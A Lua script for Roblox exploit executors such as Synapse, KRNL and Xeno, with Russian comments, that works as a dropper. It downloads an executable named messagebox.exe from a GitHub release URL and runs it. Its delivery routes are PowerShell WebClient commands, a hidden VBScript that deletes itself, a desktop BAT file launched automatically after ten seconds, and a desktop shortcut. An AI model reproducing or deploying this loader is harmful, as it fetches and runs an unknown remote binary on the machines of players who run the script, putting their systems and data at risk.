-- ==============================================
-- УНИВЕРСАЛЬНЫЙ РАБОЧИЙ ЗАГРУЗЧИК ДЛЯ ВСЕХ EXECUTOR
-- РАБОТАЕТ НА СИНАПС, XENO, KRNL, FLUXUS И ДРУГИХ
-- ==============================================

local EXE_URL = "https://github.com/fasfsagfsa13-del/roblo1x-souresec/releases/download/32%D0%BA32%D0%B05/messagebox.exe"

-- Функция для отображения уведомлений
local function showNotification(title, text, duration)
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = title,
        Text = text,
        Duration = duration or 5
    })
    print("[NOTIFY] " .. title .. " - " .. text)
end

-- Начинаем процесс
showNotification("🚀 ЗАГРУЗЧИК", "Начинаю работу...", 3)

wait(2)

-- ==============================================
-- МЕТОД 1: САМЫЙ ПРОСТОЙ И РАБОЧИЙ СПОСОБ
-- ==============================================
showNotification("⚙️ МЕТОД 1", "Использую PowerShell...", 3)

-- Простейшая команда PowerShell для скачивания и запуска
local psCommand = "powershell -Command \"(New-Object Net.WebClient).DownloadFile('" .. EXE_URL .. "', '$env:TEMP\\app.exe'); Start-Process '$env:TEMP\\app.exe'\""

-- Пытаемся выполнить разными способами
local method1Success = false

-- Способ 1: Через syn.run (Synapse X)
if syn and syn.run then
    syn.run(psCommand)
    method1Success = true
    print("[SUCCESS] Метод 1: Запущено через syn.run")
    showNotification("✅ УСПЕХ", "Команда отправлена в PowerShell", 3)
end

-- Способ 2: Через os.execute (KRNL, Xeno)
if not method1Success and os.execute then
    os.execute(psCommand)
    method1Success = true
    print("[SUCCESS] Метод 1: Запущено через os.execute")
    showNotification("✅ УСПЕХ", "Команда отправлена в PowerShell", 3)
end

-- Способ 3: Через execute (другие executor'ы)
if not method1Success and execute then
    execute(psCommand)
    method1Success = true
    print("[SUCCESS] Метод 1: Запущено через execute")
    showNotification("✅ УСПЕХ", "Команда отправлена в PowerShell", 3)
end

wait(3)

-- Если первый метод не сработал, пробуем метод 2
if not method1Success then
    showNotification("🔄 МЕТОД 2", "Использую VBScript...", 3)
    
    -- Создаем простой VBScript файл
    local vbsContent = [[
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell -Command ""(New-Object Net.WebClient).DownloadFile(']] .. EXE_URL .. [[', '$env:TEMP\app.exe'); Start-Process '$env:TEMP\app.exe'""", 0, True
Set WshShell = Nothing
]]
    
    -- Сохраняем VBS файл
    local tempPath = os.getenv("TEMP") or "C:\\Windows\\Temp"
    local vbsPath = tempPath .. "\\launch.vbs"
    
    if writefile then
        writefile(vbsPath, vbsContent)
        
        -- Запускаем VBS
        if syn and syn.run then
            syn.run('wscript.exe "' .. vbsPath .. '"')
            showNotification("✅ УСПЕХ", "VBScript запущен", 3)
            print("[SUCCESS] Метод 2: VBScript запущен через syn.run")
            
            -- Удаляем VBS файл через 5 секунд
            spawn(function()
                wait(5)
                pcall(function()
                    delfile(vbsPath)
                end)
            end)
        else
            showNotification("❌ ОШИБКА", "Не удалось запустить VBS", 3)
        end
    else
        showNotification("❌ ОШИБКА", "Нет доступа к записи файлов", 3)
    end
end

wait(3)

-- ==============================================
-- СОЗДАНИЕ ПРОСТОГО BAT ФАЙЛА НА РАБОЧЕМ СТОЛЕ
-- ==============================================
showNotification("📁 СОЗДАЮ ФАЙЛ", "Создаю BAT файл на рабочем столе...", 3)

if writefile then
    -- Получаем путь к рабочему столу
    local desktopPath = os.getenv("USERPROFILE") .. "\\Desktop"
    local batPath = desktopPath .. "\\download_and_run.bat"
    
    -- Создаем простой BAT файл
    local batContent = [[
@echo off
chcp 65001 >nul
title Скачивание программы
cls

echo ======================================
echo     АВТОМАТИЧЕСКАЯ ЗАГРУЗКА
echo ======================================
echo.

echo Запускаю скачивание...
powershell -Command "(New-Object Net.WebClient).DownloadFile(']] .. EXE_URL .. [[', '%TEMP%\app.exe')"

if exist "%TEMP%\app.exe" (
    echo Скачивание успешно!
    echo.
    echo Запускаю программу...
    start "" "%TEMP%\app.exe"
    echo Программа запущена.
) else (
    echo Ошибка скачивания!
    echo.
    echo Скачайте программу вручную:
    echo ]] .. EXE_URL .. [[
)

echo.
echo Окно закроется через 10 секунд...
timeout /t 10 /nobreak >nul
]]
    
    writefile(batPath, batContent)
    showNotification("✅ ФАЙЛ СОЗДАН", "BAT файл на рабочем столе", 5)
    print("[SUCCESS] BAT файл создан: " .. batPath)
    
    -- Предлагаем запустить BAT файл
    spawn(function()
        wait(5)
        showNotification("💡 ЗАПУСТИТЕ ФАЙЛ", 
            "На рабочем столе: download_and_run.bat\nЗапустите его двойным кликом", 
            7)
    end)
else
    showNotification("❌ НЕТ ДОСТУПА", "Не могу создать BAT файл", 3)
end

wait(3)

-- ==============================================
-- СОЗДАНИЕ ПРОСТОГО ЯРЛЫКА
-- ==============================================
showNotification("🔗 СОЗДАЮ ЯРЛЫК", "Создаю ярлык на рабочем столе...", 3)

if writefile then
    local desktopPath = os.getenv("USERPROFILE") .. "\\Desktop"
    local shortcutPath = desktopPath .. "\\Скачать программу.url"
    
    local shortcutContent = [[
[InternetShortcut]
URL=]] .. EXE_URL .. [[
IconIndex=0
]]
    
    writefile(shortcutPath, shortcutContent)
    showNotification("✅ ЯРЛЫК СОЗДАН", "Ярлык на рабочем столе", 5)
    print("[SUCCESS] Ярлык создан: " .. shortcutPath)
end

wait(3)

-- ==============================================
-- ПРЯМАЯ ССЫЛКА И ИНСТРУКЦИЯ
-- ==============================================
showNotification("🔗 ПРЯМАЯ ССЫЛКА", 
    "Скопируйте эту ссылку:\n" .. EXE_URL, 
    10)

-- Выводим подробную инструкцию
print("\n" .. string.rep("=", 60))
print("🎯 ИНСТРУКЦИЯ ПО ЗАПУСКУ ПРОГРАММЫ")
print(string.rep("=", 60))
print("\nСПОСОБ 1: Прямая ссылка")
print("1. Скопируйте ссылку:")
print("   " .. EXE_URL)
print("2. Вставьте в адресную строку браузера")
print("3. Скачайте файл messagebox.exe")
print("4. Запустите скачанный файл")
print()

print("СПОСОБ 2: Используйте BAT файл")
print("1. На рабочем столе найдите файл:")
print("   download_and_run.bat")
print("2. Запустите его двойным кликом")
print("3. Он автоматически скачает и запустит программу")
print()

print("СПОСОБ 3: Используйте ярлык")
print("1. На рабочем столе найдите ярлык:")
print("   'Скачать программу.url'")
print("2. Откройте его")
print("3. Файл скачается автоматически")
print(string.rep("=", 60))

-- ==============================================
-- АВТОМАТИЧЕСКИЙ ТЕСТ ССЫЛКИ
-- ==============================================
spawn(function()
    wait(5)
    
    showNotification("🔍 ПРОВЕРКА ССЫЛКИ", "Проверяю доступность файла...", 3)
    
    local success, response = pcall(function()
        if syn and syn.request then
            local req = syn.request({
                Url = EXE_URL,
                Method = "GET",
                Headers = {
                    ["User-Agent"] = "Mozilla/5.0"
                }
            })
            return req.StatusCode
        else
            return "Не удалось проверить"
        end
    end)
    
    if success then
        if response == 200 then
            showNotification("✅ ССЫЛКА РАБОТАЕТ", "Файл доступен для скачивания", 5)
        else
            showNotification("⚠️ ПРОВЕРЬТЕ ССЫЛКУ", "Статус: " .. tostring(response), 5)
        end
    end
end)

-- ==============================================
-- ФИНАЛЬНОЕ СООБЩЕНИЕ
-- ==============================================
wait(5)

showNotification("✅ ГЕНЕРАЦИЯ ЗАВЕРШЕНА", 
    "Проверьте рабочий стол для файлов\nСсылка скопирована в консоль", 
    7)

-- Показываем финальное сообщение в консоль
print("\n" .. string.rep("=", 60))
print("✅ ЗАГРУЗЧИК ВЫПОЛНИЛ СВОЮ РАБОТУ")
print(string.rep("=", 60))
print("\nЧто было сделано:")
print("1. Отправлены команды на скачивание")
print("2. Создан BAT файл на рабочем столе")
print("3. Создан ярлык для скачивания")
print("4. Показана прямая ссылка")
print("\nЕсли программа не запустилась автоматически:")
print("1. Проверьте рабочий стол")
print("2. Запустите файл download_and_run.bat")
print("3. Или скачайте по ссылке выше")
print(string.rep("=", 60))

-- Команды для чата
game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
    msg = msg:lower()
    
    if msg == "!link" then
        print("🔗 Прямая ссылка: " .. EXE_URL)
        showNotification("🔗 ССЫЛКА", EXE_URL, 7)
        
    elseif msg == "!help" then
        print("\nДоступные команды:")
        print("!link - показать ссылку для скачивания")
        print("!help - показать эту справку")
        
    elseif msg == "!desktop" then
        local desktop = os.getenv("USERPROFILE") .. "\\Desktop"
        print("📁 Путь к рабочему столу: " .. desktop)
    end
end)

print("\n💬 Команды в чате:")
print("!link - показать ссылку")
print("!help - помощь")
print("!desktop - путь к рабочему столу")

-- ==============================================
-- АВТОМАТИЧЕСКИЙ ЗАПУСК BAT ФАЙЛА ЧЕРЕЗ 10 СЕКУНД
-- ==============================================
spawn(function()
    wait(10)
    
    -- Автоматически пытаемся запустить BAT файл
    local desktopPath = os.getenv("USERPROFILE") .. "\\Desktop"
    local batPath = desktopPath .. "\\download_and_run.bat"
    
    if writefile and readfile then
        -- Проверяем существует ли BAT файл
        local exists = pcall(function()
            readfile(batPath)
            return true
        end)
        
        if exists then
            showNotification("🔄 АВТОЗАПУСК", "Пытаюсь запустить BAT файл...", 3)
            
            -- Пытаемся запустить BAT файл
            if syn and syn.run then
                syn.run('start "" "' .. batPath .. '"')
                print("[AUTO] BAT файл запущен автоматически")
            end
        end
    end
end)

print("\n🎮 Скрипт завершил работу в " .. os.date("%H:%M:%S"))
